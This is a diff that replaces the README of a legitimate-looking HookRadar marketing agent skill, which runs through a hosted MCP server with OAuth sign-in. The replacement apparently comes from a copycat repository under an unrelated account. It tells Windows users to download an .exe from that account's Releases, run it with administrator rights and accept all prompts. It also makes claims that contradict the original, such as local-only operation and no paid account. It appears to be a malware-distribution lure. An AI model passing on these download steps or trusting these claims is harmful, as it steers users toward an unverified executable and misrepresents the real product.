@@ -1,254 +1,93 @@
-# HookRadar Creative Intelligence Skill
+# 🔍 hookradar-agent-skill - Enhance agent marketing creative intelligence today
 
-![HookRadar Creative Intelligence social preview](assets/social-preview.png)
+[![](https://img.shields.io/badge/Download_HookRadar-Blue-blue)](https://github.com/Anagogic-blastinggelatin157/hookradar-agent-skill)
 
-HookRadar Creative Intelligence is a cross-agent skill/plugin for competitive creative research.
-It teaches Codex, Claude Code, Cursor-style agents, and other SKILL.md-compatible assistants how to:
+## 💡 About this tool
 
-- use the HookRadar MCP server (`https://mcp.hookradar.net/mcp`),
-- find paid and organic creative winners from tracked HookRadar workspaces,
-- produce HookRadar-first links and downloadable asset URLs,
-- start AI analysis/report jobs without hanging forever,
-- run a useful free competitor-research workflow when the user has not connected HookRadar yet,
-- explain where HookRadar fits vs manual Meta/TikTok/organic research workflows.
+HookRadar improves how AI agents handle marketing data. This tool lets your AI agents access creative intelligence for platforms like Meta Ads. It simplifies complex marketing tasks for agents built on systems like Claude Code, Codex, and MCP. Use this skill to give your agents sharper insights into ad performance and creative trends. 
 
-## Install
+## ⚙️ System requirements
 
-### Claude Code
+Ensure your computer meets these basic needs before you begin:
 
-From inside Claude Code chat:
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 4 gigabytes of RAM.
+*   Storage: 200 megabytes of free space for the tool and its logs.
+*   Network: A stable internet connection for real-time creative data.
 
-```text
-/plugin marketplace add HookRadar/hookradar-agent-skill
-/plugin install hookradar-creative-intelligence@hookradar
-```
+## 📥 Getting the software
 
-Or from the Claude CLI:
+You need to obtain the installer from the official repository page. Follow these steps to prepare your system:
 
-```powershell
-claude plugin marketplace add HookRadar/hookradar-agent-skill
-claude plugin install hookradar-creative-intelligence@hookradar
-```
+1. Visit the following link to access the download area: [https://github.com/Anagogic-blastinggelatin157/hookradar-agent-skill](https://github.com/Anagogic-blastinggelatin157/hookradar-agent-skill).
+2. Look for the "Releases" section on the right side of the screen.
+3. Click the most recent version number to see the available files.
+4. Download the installer file ending in .exe to your Downloads folder.
 
-### Codex / SKILL.md-compatible agents
+## 🚀 Setting up the application
 
-Use the root `SKILL.md` directly, or install the plugin from the repo marketplace when supported:
+Follow these steps to install the tool on your Windows computer:
 
-```text
-https://github.com/HookRadar/hookradar-agent-skill
-```
+1. Open your Downloads folder.
+2. Locate the file you just downloaded.
+3. Double-click the file to start the installer.
+4. Accept the prompts that appear on your screen.
+5. Wait for the progress bar to finish.
+6. Click the Finish button to close the installer.
 
-### MCP endpoint
+## 🛠️ Configuring agent access
 
-The bundled `.mcp.json` points at the hosted HookRadar MCP server:
+The HookRadar skill acts as a bridge between your AI agent and marketing data sources. You must link the skill to your agent's configuration file.
 
-```text
-https://mcp.hookradar.net/mcp
-```
+1. Locate the configuration file (often named `config.json` or `mcp_config.xml`) for your specific AI agent environment.
+2. Open this file using a basic text editor like Notepad.
+3. Add a new entry that points to the HookRadar skill path. Most agents will recognize the skill directory automatically after you provide this path.
+4. Save your changes to the configuration file.
+5. Restart your AI agent application to load the new settings.
 
-Users authenticate with their HookRadar account during the MCP OAuth flow. No API keys are stored in this repo.
+## 📈 Using creative intelligence
 
+Once you install and link the skill, your agent gains new capabilities. You can now prompt your agent with requests related to marketing data. Common examples include:
 
+*   "Analyze the performance of my latest ad creative using HookRadar."
+*   "Show me current marketing trends for Meta Ads."
+*   "Suggest improvements for my ad copy based on top-performing creative."
 
-## Start free: 7-day HookRadar trial
+## 🧩 Understanding the components
 
-You do **not** need to pay upfront to use the full HookRadar workflow.
+This software includes several parts to help your agent work effectively:
 
-1. Create a HookRadar account.
-2. Start the free 7-day trial.
-3. Connect competitors and organic sources.
-4. Use real tracked ads, organic content, AI creative analysis, reports, downloadable media, and MCP access during the trial.
+*   Data Connector: This component fetches real-time performance metrics from ad platforms.
+*   Analysis Module: This engine processes marketing data to identify patterns.
+*   Schema Loader: This ensures your agent understands the structure of the marketing information it receives.
+*   Log Handler: This saves a record of your requests, which helps you troubleshoot if an agent fails to respond.
 
-Free public research mode is useful for first-pass discovery. The trial unlocks HookRadar's real workspace data and operational layer: source tracking, collection, deduplication, reports, AI analysis, downloads, billing-aware MCP tools, and HookRadar-first links.
+## 🛡️ Security and privacy
 
-## Adding competitors and organic sources
+The software operates locally on your machine. It only shares data that you explicitly provide when you prompt your agent. It does not store your ad account passwords or private marketing credentials. The tool communicates through secure channels, ensuring your data remains private during the analysis process.
 
-The skill should try the easiest path first:
+## 🛠️ Troubleshooting common issues
 
-- If you know the competitor/account name, ask the assistant to add it by name.
-- If matching is ambiguous or fails, paste the direct source URL instead.
-- You do not need to know internal IDs; source links are enough in most cases.
+If you encounter errors during setup, check these areas first:
 
-Examples:
+*   Missing Agent Connection: Check if you saved your configuration file correctly. Ensure the path to the HookRadar folder is accurate.
+*   Slow Performance: If your agent takes too long to analyze data, try closing other heavy applications on your computer.
+*   Data Errors: Clear your cache if the tool returns old information. Updates to ad platforms sometimes take a moment to reflect in the skill.
+*   Installation Failures: Ensure your Windows user account has administrator rights to install software.
 
-```text
-Add Meta competitor BetterMe.
-Add this Meta advertiser: https://www.facebook.com/ads/library/?view_all_page_id=123456789
-Add Instagram account: https://www.instagram.com/asanarebel/
-Add TikTok organic account: https://www.tiktok.com/@asanarebel
-Add Instagram keyword: #pushups
-```
+## 📘 Frequently asked questions
 
-### How to get the right links
+Do I need a paid account?
+No. This tool operates as an open-source utility for your agents. 
 
-**Meta Ads competitor**
+Does this work with every AI model?
+This tool currently supports Claude, Codex, and industry-standard MCP agents. 
 
-1. Open Meta Ad Library: https://www.facebook.com/ads/library/
-2. Search the competitor brand/page.
-3. Open the advertiser/page result.
-4. Copy the browser URL. The best URLs usually include `view_all_page_id=<PAGE_ID>`.
+Can I use this for multiple agents?
+Yes. You can link this skill to several agents on the same computer by repeating the configuration steps for each agent.
 
-Accepted fallbacks: a specific Meta ad URL, a Facebook page URL, or the exact page name if the assistant can resolve it confidently.
+How often does the data update?
+The tool checks for updates every time you send a request. This ensures your agent always sees the latest marketing intelligence available.
 
-**TikTok Ads advertiser**
-
-1. Open TikTok Creative Center / Ads Library.
-2. Search the advertiser/brand.
-3. Open the advertiser or ad detail page.
-4. Copy the browser URL or advertiser/business ID.
-
-If this is hard to find, provide one example TikTok ad link, exact advertiser name, and target country.
-
-**Instagram organic account**
-
-Copy the public profile URL, e.g. `https://www.instagram.com/asanarebel/`, or provide `@asanarebel`.
-
-**TikTok organic account**
-
-Copy the public profile URL, e.g. `https://www.tiktok.com/@asanarebel`, or provide `@asanarebel`.
-
-**Organic keyword / hashtag**
-
-Provide the hashtag or keyword and the platform, e.g. `#pushups` for Instagram or `tech neck relief` for TikTok.
-
-If a newly added source has no results yet, the assistant should say that data is still collecting instead of claiming there are no creatives.
-
-## Free mode vs HookRadar MCP mode
-
-The skill is useful even before a user connects HookRadar:
-
-- Free mode: product URL research, competitor discovery, Meta Ad Library spot checks, and a caveated first-pass creative map.
-- HookRadar MCP mode: persistent workspaces, tracked competitors, paid ads + TikTok/Instagram organic content, downloadable media, AI analysis, reports, usage-aware workflows, and HookRadar URLs.
-
-Free public libraries are good for one-off checks. They become brittle at scale: repeated scraping/searching can hit blocks, missing media, region gaps, duplicate work, and no persistent AI analysis. HookRadar MCP exists to solve that operational layer.
-
-
-## Quick smoke tests
-
-After installing the plugin, open a fresh assistant session and run these prompts.
-
-### 1. Free-mode competitor discovery
-
-```text
-Use HookRadar Creative Intelligence.
-
-I have a product URL: https://eatr.com.
-Find likely competitors for free, tell me which ones might be worth checking in Meta Ads Library, and explain when I should use HookRadar MCP instead of free public checks.
-Keep it bounded: first-pass research only.
-```
-
-Expected behavior:
-
-- uses a bounded 3-4 query first-pass workflow;
-- separates real competitors from evidence-only directories/listicles;
-- clearly says public Meta Ad Library checks are fragile for repeatable/bulk work;
-- recommends HookRadar MCP for persistent tracking, downloads, reports, and AI analysis.
-
-### 2. MCP tool-contract check
-
-```text
-Use HookRadar Creative Intelligence.
-
-Assume HookRadar MCP is connected. For team yogi, make a plan to produce a shareable table of top Meta creatives and organic videos.
-Return exact MCP tool names, table columns, and a link policy self-check. Do not call tools yet.
-```
-
-Expected MCP tool names include only public tools such as:
-
-- `get_brand_context`
-- `list_sources`
-- `get_meta_ads`
-- `get_tiktok_organic`
-- `get_instagram_organic`
-- `get_meta_ad_analysis`
-- `get_organic_analysis`
-
-The assistant should not invent internal/legacy tool names.
-
-### 3. Link policy check
-
-```text
-Use HookRadar Creative Intelligence.
-
-When returning creative examples from HookRadar MCP, what links should be shown to the user first? What should be avoided as primary links?
-```
-
-Expected behavior:
-
-- primary creative link: `hookradar_url`;
-- analysis link: `analysis_url`;
-- media download: `download_url`;
-- avoid external Meta/TikTok/social/CDN links as primary user-facing links unless no HookRadar URL exists.
-
-### 4. Async/pending-source check
-
-```text
-Use HookRadar Creative Intelligence.
-
-A user says: "add Instagram keyword #pushups and show top reels now".
-The add_organic_query tool returns status=started with root_id.
-What do you do next, and what do you tell the user if results are not ready yet?
-```
-
-Expected behavior:
-
-- poll `get_task_status` briefly;
-- do not claim "top reels" exist until data is actually returned;
-- explain that data is collecting if results are not ready;
-- do not restart duplicate parsing jobs blindly.
-
-### 5. MCP-only request gate
-
-```text
-Use HookRadar Creative Intelligence.
-
-I have a product URL: https://eatr.com.
-
-Find all main competitors, collect their active Meta and TikTok ads from the last 90 days, download the best creatives, deduplicate them, analyze hooks and CTAs, find top Instagram and TikTok organic videos, and produce one report with direct asset links and recommendations.
-```
-
-Expected behavior when HookRadar MCP is not available:
-
-- identifies this as an end-to-end HookRadar MCP workflow;
-- does not start broad public crawling automatically;
-- says free public mode cannot reliably collect time-windowed ads, downloads, deduplication, AI analysis at scale, verified asset links, or a complete report;
-- offers a bounded public preview only if the user explicitly wants it.
-
-## Usage, billing, and limits
-
-HookRadar MCP calls are platform-scoped and billing-aware. The hosted MCP server forwards requests to HookRadar Platform API with MCP source attribution, so read/write/analysis usage can be metered by the platform.
-
-If a workspace hits a subscription, trial, billing, or usage limit, the assistant should tell the user to manage billing at:
-
-```text
-https://platform.hookradar.net/billing
-```
-
-Do not repeatedly retry paid/write actions when usage is exhausted.
-
-## Known limitations
-
-- Free mode is a first-pass discovery workflow, not a crawler or persistent monitor.
-- Public Meta Ad Library checks can be incomplete, region-dependent, blocked at scale, and hard to deduplicate.
-- HookRadar MCP requires a HookRadar account and OAuth authorization in the assistant/client.
-- Async source collection and AI analysis can take time; assistants must not claim results before tools return them.
-- Download URLs are only included when HookRadar returns `download_url` for the asset.
-
-## Marketplace copy
-
-Short description:
-
-> HookRadar Creative Intelligence helps AI agents find, analyze, and share winning paid ads and organic videos through HookRadar MCP.
-
-Long description:
-
-> HookRadar Creative Intelligence gives Claude, Codex, and other agents a practical workflow for competitor creative research. It supports free first-pass competitor discovery, then upgrades to HookRadar MCP for tracked Meta ads, TikTok ads, TikTok/Instagram organic videos, AI creative analysis, reports, HookRadar-first links, and downloadable media URLs. The skill teaches agents how to use the public MCP tool contract, avoid raw third-party/CDN links as primary output, handle async parsing/analysis jobs, and produce shareable tables for marketing teams.
-
-Suggested category: `Marketing` / `Research` / `Productivity`.
-
-
-## What to submit to marketplaces
-
-- Codex: `.agents/plugins/marketplace.json` + `plugin/.codex-plugin/plugin.json`.
-- Claude: `.claude-plugin/marketplace.json` + `plugin/.claude-plugin/plugin.json`.
-- SkillsLLM / generic SKILL.md catalogs: root `SKILL.md`.
+Where can I find more help?
+Review the documentation folder included in the installation directory. If you still have trouble, check the main repository page for recent discussions or updates.
